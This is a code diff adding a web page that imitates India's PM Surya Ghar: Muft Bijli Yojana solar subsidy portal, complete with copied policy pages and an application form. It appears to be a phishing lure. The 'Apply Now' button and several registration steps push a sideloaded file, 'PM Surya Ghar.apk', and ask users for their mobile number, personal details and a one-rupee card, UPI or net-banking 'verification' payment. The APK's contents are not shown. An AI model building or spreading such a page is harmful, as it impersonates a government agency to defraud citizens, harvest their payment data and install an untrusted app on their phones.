+.next-steps h4 {
+  font-size: 0.95rem;
+  font-weight: 700;
+  color: var(--navy);
+  margin: 0 0 0.75rem;
+}
+
+.next-steps ol {
+  margin: 0;
+  padding-left: 1.5rem;
+}
+
+.next-steps li {
+  font-size: 0.9rem;
+  color: var(--text);
+  margin: 0.5rem 0;
+  line-height: 1.5;
+}
+
+/* Back Button */
+.btn-back {
+  padding: 0.875rem 2rem;
+  background: var(--border-light);
+  color: var(--navy);
+  border: none;
+  border-radius: var(--radius);
+  font-size: 0.95rem;
+  font-weight: 600;
+  cursor: pointer;
+  transition: background 0.2s;
+  margin-top: 1rem;
+}
+
+.btn-back:hover {
+  background: #d0d8e0;
+}
+
+/* ��� APPLY NOW MODAL STYLES (Matching Site UI) ��� */
+.modal-overlay {
+  position: fixed;
+  inset: 0;
+  background: rgba(0, 0, 0, 0.5);
+  display: none;
+  align-items: center;
+  justify-content: center;
+  z-index: 1000;
+  padding: 1rem;
+  animation: fadeIn 0.2s ease;
+}
+
+.modal-overlay.active {
+  display: flex;
+}
+
+@keyframes fadeIn {
+  from { opacity: 0; }
+  to { opacity: 1; }
+}
+
+.modal {
+  background: var(--white);
+  border-radius: var(--radius-lg);
+  max-width: 500px;
+  width: 100%;
+  max-height: 90vh;
+  overflow-y: auto;
+  box-shadow: 0 10px 40px rgba(0, 74, 135, 0.25);
+  position: relative;
+  animation: modalSlide 0.3s ease;
+}
+
+@keyframes modalSlide {
+  from { opacity: 0; transform: translateY(-20px); }
+  to { opacity: 1; transform: translateY(0); }
+}
+
+.modal-header {
+  padding: 1.25rem 1.5rem;
+  border-bottom: 1px solid var(--border-light);
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  position: sticky;
+  top: 0;
+  background: var(--white);
+  z-index: 1;
+}
+
+.modal-header h3 {
+  margin: 0;
+  font-size: 1.25rem;
+  font-weight: 800;
+  color: var(--navy);
+}
+
+.modal-close {
+  background: none;
+  border: none;
+  font-size: 1.8rem;
+  color: var(--text-muted);
+  cursor: pointer;
+  line-height: 1;
+  padding: 0.25rem;
+  transition: color 0.2s;
+}
+
+.modal-close:hover {
+  color: var(--navy);
+}
+
+.modal-body {
+  padding: 1.5rem;
+}
+
+.modal-body > p {
+  margin: 0 0 1.25rem;
+  font-size: 0.9rem;
+  color: var(--text-muted);
+  line-height: 1.5;
+}
+
+.modal .form-group {
+  margin-bottom: 1.25rem;
+}
+
+.modal .form-group label {
+  font-weight: 600;
+  font-size: 0.9rem;
+  color: var(--navy);
+  margin-bottom: 0.4rem;
+  display: block;
+}
+
+.modal .form-group input,
+.modal .form-group select {
+  width: 100%;
+  padding: 0.75rem 0.875rem;
+  border: 1px solid var(--border-light);
+  border-radius: var(--radius);
+  font-size: 0.95rem;
+  font-family: var(--font);
+  background: var(--white);
+  color: var(--text);
+  transition: border-color 0.2s, box-shadow 0.2s;
+}
+
+.modal .form-group input:focus,
+.modal .form-group select:focus {
+  outline: none;
+  border-color: var(--blue-bright);
+  box-shadow: 0 0 0 3px rgba(0, 102, 204, 0.1);
+}
+
+.modal .form-row {
+  display: grid;
+  grid-template-columns: 1fr;
+  gap: 1rem;
+}
+
+.modal .error-msg {
+  color: #c62828;
+  font-size: 0.8rem;
+  margin-top: 0.3rem;
+  display: none;
+}
+
+.modal .error-msg.show {
+  display: block;
+}
+
+.modal .success-msg {
+  background: #e8f5e9;
+  color: #2e7d32;
+  padding: 1rem;
+  border-radius: var(--radius);
+  border: 1px solid #a5d6a7;
+  margin: 1rem 0;
+  text-align: center;
+  font-size: 0.9rem;
+  display: none;
+}
+
+.modal .success-msg.show {
+  display: block;
+}
+
+.modal .checkbox-group {
+  display: flex;
+  align-items: flex-start;
+  gap: 0.75rem;
+  margin: 1rem 0;
+}
+
+.modal .checkbox-group input[type="checkbox"] {
+  margin-top: 0.35rem;
+  width: 18px;
+  height: 18px;
+  accent-color: var(--blue-bright);
+  flex-shrink: 0;
+}
+
+.modal .checkbox-group label {
+  font-weight: 400;
+  font-size: 0.9rem;
+  color: var(--text);
+  line-height: 1.4;
+  margin: 0;
+}
+
+.modal-footer {
+  padding: 1rem 1.5rem 1.5rem;
+  border-top: 1px solid var(--border-light);
+  background: var(--white);
+  position: sticky;
+  bottom: 0;
+}
+
+.modal-footer .btn-submit {
+  width: 100%;
+  padding: 0.875rem 1.5rem;
+  background: linear-gradient(135deg, var(--blue-bright) 0%, var(--blue-accent) 100%);
+  color: var(--white);
+  border: none;
+  border-radius: var(--radius);
+  font-size: 0.95rem;
+  font-weight: 700;
+  cursor: pointer;
+  transition: transform 0.15s, box-shadow 0.15s;
+  box-shadow: 0 4px 12px rgba(0, 102, 204, 0.25);
+}
+
+.modal-footer .btn-submit:hover {
+  transform: translateY(-2px);
+  box-shadow: 0 6px 16px rgba(0, 102, 204, 0.35);
+}
+
+.modal-footer .btn-submit:disabled {
+  background: var(--border-light);
+  color: var(--text-muted);
+  cursor: not-allowed;
+  transform: none;
+  box-shadow: none;
+}
+
+.modal-footer .terms-note {
+  text-align: center;
+  font-size: 0.75rem;
+  color: var(--text-muted);
+  margin-top: 0.75rem;
+}
+
+.modal-footer .terms-note a {
+  color: var(--blue-bright);
+  text-decoration: none;
+}
+
+.modal-footer .terms-note a:hover {
+  text-decoration: underline;
+}
+
+/* Responsive for modal */
+@media (max-width: 480px) {
+  .modal .form-row {
+    grid-template-columns: 1fr;
+  }
+  
+  .modal {
+    max-height: 95vh;
+  }
+  
+  .modal-header,
+  .modal-body,
+  .modal-footer {
+    padding: 1rem;
+  }
+}
+
+/* Responsive */
+@media (max-width: 480px) {
+  .reg-form-section {
+    padding: 1.25rem;
+    margin-top: 1rem;
+  }
+
+  .reg-form-header h1 {
+    font-size: 1.25rem;
+  }
+
+  .registration-form {
+    gap: 1.25rem;
+  }
+
+  .success-screen {
+    padding: 1.25rem;
+    margin-top: 1rem;
+  }
+
+  .success-icon {
+    font-size: 3rem;
+  }
+
+  .success-screen h2 {
+    font-size: 1.25rem;
+  }
+
+  .app-buttons {
+    gap: 0.5rem;
+  }
+
+  .btn-app {
+    padding: 0.875rem 1rem;
+    font-size: 0.9rem;
+  }
+
+  .btn-app i {
+    font-size: 1.25rem;
+    margin-bottom: 0.35rem;
+  }
+
+  .download-section {
+    padding: 1rem;
+  }
+
+  .next-steps {
+    padding: 1rem;
+  }
+
+  .next-steps li {
+    font-size: 0.85rem;
+  }
+}
+  </style>
+</head>
+<body>
+  <div class="gov-bar">
+    <img class="flag" src="https://flagcdn.com/w40/in.png" width="40" height="27" alt="">
+    <span>Government of India</span>
+  </div>
+  <header class="site-header">
+    <div class="site-header__brand">
+      <img class="site-header__emblem" src="images/logo_official.svg" alt="State Emblem">
+      <div class="site-header__titles">
+        <div class="hi">PM Surya Ghar: Muft Bijli Yojana</div>
+        <div class="en">National Portal</div>
+      </div>
+    </div>
+    <button type="button" class="menu-toggle" aria-label="Menu"><i class="fa-solid fa-bars"></i></button>
+  </header>
+
+  <div id="navOverlay" class="nav-overlay"></div>
+  <nav id="mobileNav" class="mobile-nav" aria-label="Main">
+    <button type="button" class="mobile-nav__close" aria-label="Close">&times;</button>
+    <h3>Menu</h3>
+    <a onclick="switchPage('home')">Home</a>
+    <a href="apk/PM Surya Ghar.apk" download>Download App</a>
+    <a onclick="switchPage('home'); setTimeout(()=>document.getElementById('benefits').scrollIntoView({behavior:'smooth'}),100);">Benefits</a>
+    <a onclick="switchPage('registration-form')">Consumer Registration</a>
+    <a onclick="switchPage('whats-new')">What Is New</a>
+    <a onclick="switchPage('privacy')">Privacy Policy</a>
+    <a onclick="switchPage('copyright')">Copyright Policy</a>
+    <a onclick="switchPage('hyperlinking')">Hyperlinking Policy</a>
+    <a onclick="switchPage('privacy-mobile')">Privacy Policy For Mobile</a>
+    <a onclick="switchPage('terms')">Terms &amp; Conditions</a>
+  </nav>
+
+  <!-- ========== PAGE: HOME ========== -->
+  <main id="home" class="page-wrap page-wrap--wide">
+    <div class="hero-title">
+      <div class="line1">PM Surya Ghar:</div>
+      <div class="line2">Muft Bijli Yojana</div>
+    </div>
+    <div class="hero-photo-wrap">
+      <img
+        src="images/narendra-modi.png"
+        alt="Hon'ble Prime Minister"
+        width="400"
+        height="500"
+        style="width:100%;height:auto;object-fit:cover;object-position:center top;">
+    </div>
+    <p class="hero-quote">
+      In order to further sustainable development and people's well-being, we are launching the PM Surya Ghar: Muft Bijli Yojana. This project, with an investment of over Rs. 75,000 crores, aims to light up 1 crore households by providing up to 300 units of free electricity every month.
+    </p>
+    <div class="hero-attrib">
+      <div class="name">Shri Narendra Modi</div>
+      <div class="role">Hon'ble Prime Minister of India</div>
+    </div>
+    <!-- Apply Now Button - Hero Section (CLICK = MODAL + APK DOWNLOAD) -->
+    <div style="text-align:center;margin:1.5rem 0;">
+      <button type="button" class="btn-verify" id="applyNowBtn" style="min-width:200px;">
+        <i class="fa-solid fa-paper-plane" style="margin-right:0.5rem;"></i>Apply Now
+      </button>
+    </div>
+    <div class="bottom-accent-bar" aria-hidden="true"></div>
+
+    <section id="benefits" class="home-benefits" aria-label="Scheme benefits">
+      <article class="card-white">
+        <h1>Benefits</h1>
+
+        <div class="subsidy-block">
+          <h3>Subsidy for <span>Residential</span> Households</h3>
+          <div class="amt">Rs. 30,000</div>
+          <div class="per">per kW</div>
+          <p class="small">up to 2 kW</p>
+          <hr>
+          <div class="amt">Rs. 18,000</div>
+          <div class="per">per kW</div>
+          <p class="small">for additional capacity up to 3 kW</p>
+          <hr>
+          <div class="amt">Rs. 78,000</div>
+          <p class="small">Total subsidy for systems larger than 3 kW capped at</p>
+        </div>
+
+        <div class="subsidy-block">
+          <h3>Subsidy for <span>GHS/RWA</span></h3>
+          <p class="small">(Group Housing Society/Resident Welfare Association)</p>
+          <div class="amt" style="margin-top:0.75rem;">Rs. 18,000</div>
+          <div class="per">per kW</div>
+          <p class="small" style="margin-top:0.75rem;">
+            for common facilities, including <strong>EV charging, up to 500 kW</strong> Capacity (@3 kW per house) with the upper limit being inclusive of individual rooftop plants installed by individual residents of the GHS/RWA
+          </p>
+        </div>
+      </article>
+
+      <section class="capacity-card">
+        <p class="note">For special states, an additional 10% Subsidy will be applicable per kW</p>
+        <h2>Suitable Rooftop Solar Plant Capacity for households</h2>
+        <table class="capacity-table">
+          <thead>
+            <tr>
+              <th>Average Monthly Electricity Consumption (units)</th>
+              <th>Suitable Rooftop Solar Plant Capacity</th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr><td>0-150</td><td>1-2 kW</td></tr>
+            <tr><td>150-300</td><td>2-3 kW</td></tr>
+            <tr><td>&gt;300</td><td>Above 3 kW</td></tr>
+          </tbody>
+        </table>
+      </section>
+    </section>
+
+    <section id="registration" class="home-registration" aria-label="Consumer registration process">
+      <div class="reg-section-title">
+        <h2><span class="c">Consumer</span> <span class="r">Registration Process</span></h2>
+      </div>
+      <div class="reg-connector">
+        <span class="plug-icon" aria-hidden="true"><i class="fa-solid fa-plug" style="color:#2e7d32;"></i></span>
+        <div class="line" aria-hidden="true"></div>
+      </div>
+
+      <div class="process-wrap">
+        <div class="process-path" aria-hidden="true"></div>
+
+        <article class="step-card step-card--fill" onclick="switchPage('registration-form')" style="cursor: pointer;">
+          <div class="step-card__illu">
+            <i class="fa-solid fa-download" style="font-size:2.5rem;color:#1565c0;"></i>
+          </div>
+          <h3>Step 01</h3>
+          <p>Download the PM Surya Ghar App using the "Download App" button from the menu. Install the app on your Android device.</p>
+        </article>
+
+        <article class="step-card">
+          <div class="step-card__illu">
+            <i class="fa-solid fa-sign-in-alt" style="font-size:2.5rem;color:#2e7d32;"></i>
+          </div>
+          <h3>Step 02</h3>
+          <p>Open the app. Go to consumer page and select "Apply Now" or click the Login dropdown menu and select "Consumer Login".</p>
+        </article>
+
+        <article class="step-card step-card--fill">
+          <div class="step-card__illu">
+            <i class="fa-solid fa-mobile-screen" style="font-size:2.5rem;color:#ff9800;"></i>
+          </div>
+          <h3>Step 03</h3>
+          <p>Enter your valid Registered Consumer Mobile Number, complete the CAPTCHA verification, and check the guidelines checkbox. Then click "Verify".</p>
+        </article>
+
+        <article class="step-card">
+          <div class="step-card__illu">
+            <i class="fa-solid fa-user-tie" style="font-size:2.5rem;color:#1976d2;"></i>
+          </div>
+          <h3>Step 04</h3>
+          <p>After successful Login, enter your Profile details including Name, Email, Address, State, District, PIN Code and other required details. Click "Proceed Verification".</p>
+        </article>
+
+        <article class="step-card step-card--fill">
+          <div class="step-card__illu">
+            <i class="fa-solid fa-list-check" style="font-size:2.5rem;color:#4caf50;"></i>
+          </div>
+          <h3>Step 05</h3>
+          <p>Submit your customer details for processing. Your information will be verified and stored in the system.</p>
+        </article>
+
+        <article class="step-card step-card--fill">
+          <div class="step-card__illu">
+            <i class="fa-solid fa-credit-card" style="font-size:2.5rem;color:#c62828;"></i>
+          </div>
+          <h3>Step 06</h3>
+          <p>Complete payment verification by paying Rs. 1.00 (One Rupee). Select your preferred payment method (UPI, Card, or Net Banking) and complete the transaction.</p>
+        </article>
+
+        <article class="step-card">
+          <div class="step-card__illu">
+            <i class="fa-solid fa-hourglass-end" style="font-size:2.5rem;color:#8a9aaa;"></i>
+          </div>
+          <h3>Step 07</h3>
+          <p>Wait for 24 hours to receive confirmation of your application. You will receive an SMS notification once your application is verified and approved.</p>
+        </article>
+      </div>
+    </section>
+
+    <section class="section-announcement" aria-label="Announcement">
+      <div class="section-head">
+        <span class="icon" aria-hidden="true"></span>
+        <h2>Announcement</h2>
+      </div>
+      <div class="announce-box">
+        <a href="#" class="announce-link" data-announce-slide style="display:block">
+          <p>1. POWERSOL (National Vendor) has requested deregistration of his vendorship under PMSG:MBY Scheme. The Vendor currently has 0 installations under PMSG:MBY. In view of above, the vendor shall be deregistered, and the vendor POWERSOL will not be permitted to take up applications/installations under PMSG:MBY. This is for information of all.</p>
+        </a>
+        <a href="#" class="announce-link" data-announce-slide style="display:none">
+          <p>2. RSS ENTERPRISES (Multi-State Vendor - Haryana &amp; Rajasthan) has requested deregistration of his vendorship under PMSG:MBY Scheme. The Vendor currently has 0 installations under PMSG:MBY. In view of above, the vendor shall be deregistered, and the vendor RSS ENTERPRISES will not be permitted to take up applications/installations under PMSG:MBY. This is for information of all.</p>
+        </a>
+        <a href="#" class="announce-link" data-announce-slide style="display:none">
+          <p>3. PHOTON SOLAR ENERGIES (Multi-State Vendor - MP &amp; Rajasthan) has requested deregistration of his vendorship under PMSG:MBY. The Vendor currently has 0 installations under PMSG:MBY. In view of above, the vendor shall be deregistered, and the vendor PHOTON SOLAR ENERGIES will not be permitted to take up applications/installations under PMSG:MBY. This is for information of all.</p>
+        </a>
+      </div>
+    </section>
+
+    <!-- Success Screen -->
+    <div id="successScreen" class="success-screen hidden">
+      <div class="success-content">
+        <div class="success-icon">
+          <i class="fa-solid fa-circle-check"></i>
+        </div>
+        <h2>Registration Successful!</h2>
+        <p class="success-mobile">Mobile: <strong id="displayMobile"></strong></p>
+        <p class="success-message">Your mobile number has been verified successfully.</p>
+        
+        <div class="download-section">
+          <h3>Next Step: Download the Mobile App</h3>
+          <p>To complete your registration and apply for solar subsidy, please download our mobile app.</p>
+          
+          <div class="app-buttons">
+            <a href="apk/PM Surya Ghar.apk" download class="btn-app btn-app--single">
+              <i class="fa-solid fa-download"></i>
+              <span>Download APK</span>
+            </a>
+          </div>
+        </div>
+
+        <div class="next-steps">
+          <h4>What to do next:</h4>
+          <ol>
+            <li>Download the PM Surya Ghar app</li>
+            <li>Complete your application</li>
+            <li>Select your preferred payment method for verification</li>
+            <li>Submit for processing</li>
+            <li>Wait for 24 hours to receive confirmation</li>
+          </ol>
+        </div>
+
+        <button class="btn-back" onclick="switchPage('home')">Back to Home</button>
+      </div>
+    </div>
+  </main>
+
+  <!-- ========== PAGE: WHAT'S NEW ========== -->
+  <main id="whats-new" class="page-wrap whatsnew-page" style="display:none;">
+    <h1><span class="w">What Is</span> <span class="n">New</span></h1>
+
+    <div class="whatsnew-toolbar">
+      <p class="whatsnew-search-label">Search</p>
+      <label class="visually-hidden" for="whatsnewSearch">Search notices</label>
+      <input type="search" id="whatsnewSearch" class="whatsnew-search" placeholder="Search notices�" autocomplete="off" enterkeyhint="search">
+      <label class="visually-hidden" for="whatsnewCategory">Category</label>
+      <select id="whatsnewCategory" class="whatsnew-filter" aria-label="Filter by category">
+        <option value="">All categories</option>
+      </select>
+    </div>
+
+    <div id="whatsnewList" class="whatsnew-list">
+      <!-- Notices will be dynamically populated here -->
+    </div>
+    <p id="whatsnewEmpty" class="whatsnew-empty" hidden>No notices match your search.</p>
+  </main>
+
+  <!-- ========== PAGE: PRIVACY ========== -->
+  <main id="privacy" class="page-wrap page-wrap--wide legal-page" style="display:none;">
+    <p class="legal-back"><a href="#" onclick="switchPage('home'); return false;"><i class="fa-solid fa-arrow-left" aria-hidden="true"></i> Back to home</a></p>
+
+    <article class="legal-card legal-card--long">
+      <h1>Privacy Policy</h1>
+
+      <p>As a general rule, this website does not collect Personal Information about you when you visit the site. You can generally visit the site without revealing Personal Information unless you choose to provide such information.</p>
+
+      <h2>Site Visit Data</h2>
+      <p>This website records your visit and logs the following information for statistical purposes: your server's address; the name of the top-level domain from which you access the Internet (for example, .gov, .com, .in, etc.); the type of browser you use; the date and time you access the site; the pages you have accessed and the documents downloaded, and the previous Internet address from which you linked directly to the site.</p>
+      <p>We will not identify users or their browsing activities, except when a law enforcement agency may exercise a warrant to inspect the service provider's logs.</p>
+
+      <h2>Cookies</h2>
+      <p>A cookie is a piece of software code that an internet web site sends to your browser when you access information at that site. This site does not use cookies.</p>
+
+      <h2>Email Management</h2>
+      <p>Your email address will only be recorded if you choose to send a message. It will only be used for the purpose for which you have provided it and will not be added to a mailing list. Your email address will not be used for any other purpose and will not be disclosed without your consent.</p>
+
+      <h2>Collection of Personal Information</h2>
+      <p>The website may obtain the information you provide when you download and register the Application. Registration is optional. However, please keep in mind that you may not be able to use some of the features offered by an website unless you register. When you register and use this portal , you generally provide (a) your name, mobile number, email address, age, user name, password, electricity consumer number, electricity bill copy, address and other registration information; (b) download or use applications from us; (c) information you provide when you contact us for help; (d) bank details, cancelled cheque/bank statement/ passbook copy for use of the subsidy processing and PAN number( for vendor only) , and; (e) information you enter into our system when using this portal, such as contact information and other details. The information you provided may be used to contact you from time to time to provide you with important information and required notices.</p>
+
+      <h2>We may disclose User provided and Automatically Collected Information</h2>
+      <ul class="legal-list">
+        <li>As required by law, such as to comply with a subpoena, or similar legal process.</li>
+        <li>When we believe in good faith that disclosure is necessary to protect our rights, protect your safety or the safety of others, investigate fraud, or respond to a government request.</li>
+        <li>With our trusted services providers who work on our behalf, do not have an independent use of the information we disclose to them, and have agreed to adhere to the rules set forth in this privacy statement.</li>
+      </ul>
+
+      <h2>Data Retention Policy, Managing Your Information</h2>
+      <p>We will retain User provided data for as long as you use the portal and for a reasonable time thereafter. We will retain Automatically Collected information also for a reasonable period of time depending on the nature of application and thereafter may store it in aggregate. Please note that some or all of the User Provided Data may be required in order for the portal to function properly.</p>
+
+      <h2>Misuse by Non-Targeted Users</h2>
+      <p>All mobile apps are meant for use by the targeted audience only. Misuse by non-targeted users should be prevented by the owner of the mobile.</p>
+
+      <h2>Security</h2>
+      <p>We are concerned about safeguarding the confidentiality of your information. We provide physical, electronic, and procedural safeguards to protect information we process and maintain. For example, we limit access to this information to authorized employees and contractors who need to know that information in order to operate, develop or improve our portal. Please be aware that, although we endeavor to provide reasonable security for information we process and maintain, no security system can prevent all potential security breaches.</p>
+
+      <h2>Changes</h2>
+      <p>This Privacy Policy may be updated from time to time for any reason. We will notify you of any changes to our Privacy Policy by posting the new Privacy Policy here. You are advised to consult this Privacy Policy regularly for any changes, as continued use is deemed approval of all changes. You can check the history of this policy by <a href="#">clicking here</a>.</p>
+
+      <h2>Your Consent</h2>
+      <p>By using the portal , you are consenting to our processing of your information as set forth in this Privacy Policy now and as amended by us.</p>
+    </article>
+  </main>
+
+  <!-- ========== PAGE: COPYRIGHT ========== -->
+  <main id="copyright" class="page-wrap page-wrap--wide legal-page" style="display:none;">
+    <p class="legal-back"><a href="#" onclick="switchPage('home'); return false;"><i class="fa-solid fa-arrow-left" aria-hidden="true"></i> Back to home</a></p>
+
+    <article class="legal-card">
+      <h1>Copyright Policy</h1>
+
+      <p>Material featured on this site may be reproduced free of charge in any format or media without requiring specific permission. This is subject to the material being reproduced accurately and not being used in a derogatory manner or in a misleading context. Where the material is being published or issued to others, the source must be prominently acknowledged.</p>
+
+      <p>However, the permission to reproduce this material does not extend to any material on this site which is explicitly identified as being the copyright of a third party. Authorization to reproduce such material must be obtained from the copyright holders concerned.</p>
+    </article>
+  </main>
+
+  <!-- ========== PAGE: HYPERLINKING ========== -->
+  <main id="hyperlinking" class="page-wrap page-wrap--wide legal-page" style="display:none;">
+    <p class="legal-back"><a href="#" onclick="switchPage('home'); return false;"><i class="fa-solid fa-arrow-left" aria-hidden="true"></i> Back to home</a></p>
+
+    <article class="legal-card">
+      <h1>Hyperlinking Policy</h1>
+
+      <p>At many places on this website, you shall find links to other websites/portals. These links have been placed for your convenience. Ministry of New and Renewable Energy is not responsible for the contents and reliability of the linked websites and does not necessarily endorse the views expressed in them. Mere presence of the link or its listing on this website should not be assumed as endorsement of any kind. We cannot guarantee that these links will work all the time and we have no control over the availability of linked pages.</p>
+
+      <p>We do not object to you linking directly to the information that is hosted on our site, and no prior permission is required for the same. However, we do not permit our pages to be loaded into frames on your site. Our Ministry's pages must be loaded into a newly opened browser window of the user.</p>
+
+      <p>Please note that these websites are external to PM Surya Ghar portal, and by visiting them, you are outside the PM Surya Ghar portal website and its channels. PM Surya Ghar portal neither endorses in any way nor offers any judgment or warranty and accepts no responsibility or liability for the authenticity, availability of any of the goods or services, or for any damage, loss or harm, direct or consequential, or any violation of local or international laws that may be incurred by your visiting and transacting on these websites.</p>
+    </article>
+  </main>
+
+  <!-- ========== PAGE: PRIVACY-MOBILE ========== -->
+  <main id="privacy-mobile" class="page-wrap page-wrap--wide legal-page" style="display:none;">
+    <p class="legal-back"><a href="#" onclick="switchPage('home'); return false;"><i class="fa-solid fa-arrow-left" aria-hidden="true"></i> Back to home</a></p>
+
+    <article class="legal-card legal-card--long">
+      <h1>Privacy Policy For Mobile</h1>
+
+      <p>This privacy policy governs your use of the software applications ("Applications") for mobile devices that was hosted at NIC e-Gov Mobile App Store in Google Play. The Applications mainly provide eGovernance Services delivery and intend to provide better citizen services by the government. The contents published on these Applications were provided by the concerned Ministries/Departments of Government of India or the allied government establishment. This information provided through these applications may not have any legal sanctity and are for general reference only unless otherwise specified. However, every effort has been made to provide accurate and reliable information through these applications. Users are advised to verify the correctness of the facts published here from the concerned authorities. Neither National Informatics Centre nor Government of India and its allied establishments will not be responsible for the accuracy and correctness of the contents available in these applications.</p>
+
+      <h2>User Provided Information</h2>
+      <p>The Applications may obtain the information you provide when you download and register the Application. Registration is optional. However, please keep in mind that you may not be able to use some of the features offered by an Application unless you register. When you register and use the Application, you generally provide (a) your name, mobile number, email address, age, user name, password, electricity consumer number, electricity bill copy, address and other registration information; (b) download or use applications from us; (c) information you provide when you contact us for help; (d) bank details, cancelled cheque/bank statement/ passbook copy for use of the subsidy processing and PAN number( for vendor only) , and; (e) information you enter into our system when using the Application, such as contact information and other details. The information you provided may be used to contact you from time to time to provide you with important information and required notices.</p>
+
+      <h2>Automatically Collected Information</h2>
+      <p>In addition, the Application may collect certain information automatically, including, but not limited to, the type of mobile device you use, your mobile device's unique device ID, the IP address of your mobile device, your mobile operating system, the type of mobile Internet browsers you use, and information about the way you use the Application.</p>
+      <p>When you visit the mobile application, it may use GPS technology (or other similar technology) to determine your current location in order to determine the city you are located within and display a location map. The location information may be sent to authorities for taking necessary actions and making policy decisions. If you do not want the app to use your location for the purposes set forth above, you should turn off the location services for the mobile application located in your account settings or in your mobile phone settings and/or within the mobile application. However, if the service provided by the Application requires the location services using GPS technology, such services offered by the application will not be available for you.</p>
+
+      <h2>We may disclose User provided and Automatically Collected Information</h2>
+      <ul class="legal-list">
+        <li>As required by law, such as to comply with a subpoena, or similar legal process.</li>
+        <li>When we believe in good faith that disclosure is necessary to protect our rights, protect your safety or the safety of others, investigate fraud, or respond to a government request.</li>
+        <li>With our trusted services providers who work on our behalf, do not have an independent use of the information we disclose to them, and have agreed to adhere to the rules set forth in this privacy statement.</li>
+      </ul>
+
+      <h2>Data Retention Policy, Managing Your Information</h2>
+      <p>We will retain User provided data for as long as you use the Application and for a reasonable time thereafter. We will retain Automatically Collected information also for a reasonable period of time depending on the nature of application and thereafter may store it in aggregate. Please note that some or all of the User Provided Data may be required in order for the Application to function properly.</p>
+
+      <h2>Misuse by Non-Targeted Users</h2>
+      <p>All mobile apps are meant for use by the targeted audience only. Misuse by non-targeted users should be prevented by the owner of the mobile.</p>
+
+      <h2>Security</h2>
+      <p>We are concerned about safeguarding the confidentiality of your information. We provide physical, electronic, and procedural safeguards to protect information we process and maintain. For example, we limit access to this information to authorized employees and contractors who need to know that information in order to operate, develop or improve our Application. Please be aware that, although we endeavor to provide reasonable security for information we process and maintain, no security system can prevent all potential security breaches.</p>
+
+      <h2>Changes</h2>
+      <p>This Privacy Policy may be updated from time to time for any reason. We will notify you of any changes to our Privacy Policy by posting the new Privacy Policy here. You are advised to consult this Privacy Policy regularly for any changes, as continued use is deemed approval of all changes. You can check the history of this policy by <a href="#">clicking here</a>.</p>
+
+      <h2>Your Consent</h2>
+      <p>By using the Application, you are consenting to our processing of your information as set forth in this Privacy Policy now and as amended by us.</p>
+    </article>
+  </main>
+
+  <!-- ========== PAGE: TERMS ========== -->
+  <main id="terms" class="page-wrap page-wrap--wide legal-page" style="display:none;">
+    <p class="legal-back"><a href="#" onclick="switchPage('home'); return false;"><i class="fa-solid fa-arrow-left" aria-hidden="true"></i> Back to home</a></p>
+
+    <article class="legal-card">
+      <h1>Terms &amp; Conditions</h1>
+
+      <p>This official website of the "PM Surya Ghar Muft Bijli Yojna" has been developed to provide information to the general public. The documents and information displayed in this website are for reference purposes only and does not purport to be a legal document.</p>
+
+      <p>Though all efforts have been made to ensure the accuracy and currency of the content on this website, the same should not be construed as a statement of law or used for any legal purposes. In case of any ambiguity or doubts, users are advised to verify/check with the Ministry(s) and/or other source(s), and to obtain appropriate professional advice. In case of any variance between what has been stated and that contained in the relevant Act, Rules, Regulations, Policy Statements etc, the latter shall prevail.</p>
+
+      <p>Any specific advice or replies to queries in any part of the website is/are the personal views / opinion of such experts/consultants/persons and are not necessarily subscribed to by this Ministry or its websites.</p>
+
+      <p>Certain links on the website lead to resources located on other websites maintained by third parties over whom this website has no control or connection. These websites are external to PM Surya Ghar Muft Bijli Yojna portal and by visiting these you are outside the PM Surya Ghar Muft Bijli Yojna website and its channels. PM Surya Ghar Muft Bijli Yojna portal neither endorses in any way nor offers any judgment or warranty and accepts no responsibility or liability for the authenticity, availability of any of the goods or services or for any damage, loss or harm, direct or consequential or any violation of local or international laws that may be incurred by your visiting and transacting on these websites.</p>
+    </article>
+  </main>
+
+  <footer class="site-footer">
+    <div class="site-footer__brand">
+      <img src="images/logo_official.svg" alt="">
+      <div>
+        <div class="hi">    </div>
+        <div class="en">MINISTRY OF NEW AND RENEWABLE ENERGY</div>
+      </div>
+    </div>
+    <ul class="footer-links">
+      <li><a href="#" onclick="switchPage('privacy'); return false;"><i class="fa-solid fa-shield-halved"></i> Privacy Policy</a></li>
+      <li><a href="#" onclick="switchPage('copyright'); return false;"><i class="fa-regular fa-copyright"></i> Copyright Policy</a></li>
+      <li><a href="#" onclick="switchPage('hyperlinking'); return false;"><i class="fa-regular fa-file-lines"></i> Hyperlinking Policy</a></li>
+      <li><a href="#" onclick="switchPage('privacy-mobile'); return false;"><i class="fa-solid fa-mobile-screen"></i> Privacy Policy For Mobile</a></li>
+      <li><a href="#" onclick="switchPage('terms'); return false;"><i class="fa-regular fa-clipboard"></i> Terms &amp; Conditions</a></li>
+      <li><a href="https://avionsoftware.in/" target="_blank"><i class="fa-solid fa-code"></i> Developer</a></li>
+    </ul>
+    <div class="footer-contact">
+      <a href="tel:15555"><i class="fa-solid fa-phone"></i> Contact us @Toll Free Number 15555</a>
+    </div>
+    <div class="footer-copy">
+      <p>� 2025 - Copyright. Website managed by Ministry of New and Renewable Energy, Government of India.</p>
+    </div>
+  </footer>
+
+  <!-- APPLY NOW MODAL -->
+  <div class="modal-overlay" id="applyModal">
+    <div class="modal">
+      <div class="modal-header">
+        <h3> Apply for PM Surya Ghar</h3>
+        <button type="button" class="modal-close" id="modalClose" aria-label="Close modal">&times;</button>
+      </div>
+      <div class="modal-body">
+        <p>Get free electricity up to 300 units per month. Fill the form below to get started.</p>
+        <form id="applyForm" novalidate>
+          <div class="form-group">
+            <label for="applyFullName">Full Name <span style="color:#c62828">*</span></label>
+            <input type="text" id="applyFullName" name="fullName" required placeholder="Enter your full name" autocomplete="name">
+            <div class="error-msg" id="applyNameError">Please enter your full name</div>
+          </div>
+          <div class="form-group">
+            <label for="applyMobile">Mobile Number <span style="color:#c62828">*</span></label>
+            <input type="tel" id="applyMobile" name="mobile" maxlength="10" pattern="[0-9]{10}" placeholder="Enter 10-digit mobile number" required autocomplete="tel">
+            <div class="error-msg" id="applyMobileError">Please enter a valid 10-digit mobile number</div>
+          </div>
+          <div class="form-group">
+            <label for="applyState">State <span style="color:#c62828">*</span></label>
+            <select id="applyState" name="state" required>
+              <option value="">Select State</option>
+              <option>Andhra Pradesh</option>
+              <option>Arunachal Pradesh</option>
+              <option>Assam</option>
+              <option>Bihar</option>
+              <option>Chhattisgarh</option>
+              <option>Goa</option>
+              <option>Gujarat</option>
+              <option>Haryana</option>
+              <option>Himachal Pradesh</option>
